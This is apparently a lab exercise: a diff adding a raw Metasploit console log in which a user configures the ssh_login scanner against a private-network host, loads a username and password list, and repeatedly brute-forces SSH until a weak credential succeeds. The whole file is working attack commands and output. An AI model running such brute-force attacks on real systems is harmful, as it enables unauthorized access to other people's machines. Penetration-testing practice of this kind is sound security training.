@@ -1,0 +1,208 @@
+#PROJECT 1
+msfconsole
+Metasploit tip: View all productivity tips with the tips command
+                                                  
+               .;lxO0KXXXK0Oxl:.
+           ,o0WMMMMMMMMMMMMMMMMMMKd,
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx
+.WMMMMMMMMM:                       :MMMMMMMMMM,
+xMMMMMMMMMo                         lMMMMMMMMMO
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;
+.WMMMMMMMMMc                         'OMMMMMM0,
+ lMMMMMMMMMMk.                         .kMMO'
+  dMMMMMMMMMMWd'                         ..
+   cWMMMMMMMMMMMNxc'.                ##########
+    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
+      ;0MMMMMMMMMMMMMMMo.          +:+
+        .dNMMMMMMMMMMMMo          +#++:++#+
+           'oOWMMMMMMMMo                +:+
+               .,cdkO0K;        :+:    :+:                                
+                                :::::::+:
+                      Metasploit
+
+       =[ metasploit v6.4.34-dev                          ]
++ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]
++ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search ssh_login
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  auxiliary/scanner/ssh/ssh_login         .                normal  No     SSH Login Check Scanner
+   1  auxiliary/scanner/ssh/ssh_login_pubkey  .                normal  No     SSH Public Key Login Scanner
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey
+
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank
+                                                username and password
+   BLANK_PASSWORDS   false            no        Try blank passwords for all us
+                                                ers
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0
+                                                 to 5
+   CreateSession     true             no        Create a new session for every
+                                                 successful login
+   DB_ALL_CREDS      false            no        Try each user/password couple
+                                                stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the curre
+                                                nt database to the list
+   DB_ALL_USERS      false            no        Add all users in the current d
+                                                atabase to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stor
+                                                ed in the current database (Ac
+                                                cepted: none, user, user&realm
+                                                )
+   PASSWORD                           no        A specific password to authent
+                                                icate with
+   PASS_FILE                          no        File containing passwords, one
+                                                 per line
+   RHOSTS                             yes       The target host(s), see https:
+                                                //docs.metasploit.com/docs/usi
+                                                ng-metasploit/basics/using-met
+                                                asploit.html
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credentia
+                                                l works for a host
+   THREADS           1                yes       The number of concurrent threa
+                                                ds (max one per host)
+   USERNAME                           no        A specific username to authent
+                                                icate as
+   USERPASS_FILE                      no        File containing users and pass
+                                                words separated by space, one
+                                                pair per line
+   USER_AS_PASS      false            no        Try the username as the passwo
+                                                rd for all users
+   USER_FILE                          no        File containing usernames, one
+                                                 per line
+   VERBOSE           false            yes       Whether to print output for al
+                                                l attempts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.132.129
+rhosts => 192.168.132.129
+msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
+VERBOSE => true
+msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE Desktop/attack1.txt
+USER_FILE => Desktop/attack1.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE Desktop/attack1.txt
+PASS_FILE => Desktop/attack1.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 192.168.132.129:22 - Starting bruteforce
+[-] Could not connect: The connection was refused by the remote host (192.168.132.129:22).
+[-] Could not connect: The connection was refused by the remote host (192.168.132.129:22).
+[-] Could not connect: The connection was refused by the remote host (192.168.132.129:22).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > exploit
+
+[*] 192.168.132.129:22 - Starting bruteforce
+[-] Could not connect: The connection was refused by the remote host (192.168.132.129:22).
+[-] Could not connect: The connection was refused by the remote host (192.168.132.129:22).
+[-] Could not connect: The connection was refused by the remote host (192.168.132.129:22).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting    Required  Description
+   ----              ---------------    --------  -----------
+   ANONYMOUS_LOGIN   false              yes       Attempt to login with a blan
+                                                  k username and password
+   BLANK_PASSWORDS   false              no        Try blank passwords for all
+                                                  users
+   BRUTEFORCE_SPEED  5                  yes       How fast to bruteforce, from
+                                                   0 to 5
+   CreateSession     true               no        Create a new session for eve
+                                                  ry successful login
+   DB_ALL_CREDS      false              no        Try each user/password coupl
+                                                  e stored in the current data
+                                                  base
+   DB_ALL_PASS       false              no        Add all passwords in the cur
+                                                  rent database to the list
+   DB_ALL_USERS      false              no        Add all users in the current
+                                                   database to the list
+   DB_SKIP_EXISTING  none               no        Skip existing credentials st
+                                                  ored in the current database
+                                                   (Accepted: none, user, user
+                                                  &realm)
+   PASSWORD                             no        A specific password to authe
+                                                  nticate with
+   PASS_FILE         Desktop/attack1.t  no        File containing passwords, o
+                     xt                           ne per line
+   RHOSTS            192.168.132.129    yes       The target host(s), see http
+                                                  s://docs.metasploit.com/docs
+                                                  /using-metasploit/basics/usi
+                                                  ng-metasploit.html
+   RPORT             22                 yes       The target port
+   STOP_ON_SUCCESS   true               yes       Stop guessing when a credent
+                                                  ial works for a host
+   THREADS           1                  yes       The number of concurrent thr
+                                                  eads (max one per host)
+   USERNAME                             no        A specific username to authe
+                                                  nticate as
+   USERPASS_FILE                        no        File containing users and pa
+                                                  sswords separated by space,
+                                                  one pair per line
+   USER_AS_PASS      false              no        Try the username as the pass
+                                                  word for all users
+   USER_FILE         Desktop/attack1.t  no        File containing usernames, o
+                     xt                           ne per line
+   VERBOSE           true               yes       Whether to print output for
+                                                  all attempts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 192.168.132.129:22 - Starting bruteforce
+[-] 192.168.132.129:22 - Could not connect: execution expired
+[-] Could not connect: The connection was refused by the remote host (192.168.132.129:22).
+[-] Could not connect: The connection was refused by the remote host (192.168.132.129:22).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 192.168.132.129:22 - Starting bruteforce
+[-] 192.168.132.129:22 - Failed: 'a:a'
+[-] 192.168.132.129:22 - Failed: 'a:s'
+[-] 192.168.132.129:22 - Failed: 'a:d'
+[-] 192.168.132.129:22 - Failed: 'a:f'
+[-] 192.168.132.129:22 - Failed: 'a:c'
+[-] 192.168.132.129:22 - Failed: 'a:v'
+[-] 192.168.132.129:22 - Failed: 'a:q'
+[-] 192.168.132.129:22 - Success: 'a:a'
+[-] 192.168.132.129:22 - Could not connect: connection closed by remote host
+[-] 192.168.132.129:22 - Could not connect: connection closed by remote host
+[-] 192.168.132.129:22 - Could not connect: connection closed by remote host
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > 
+
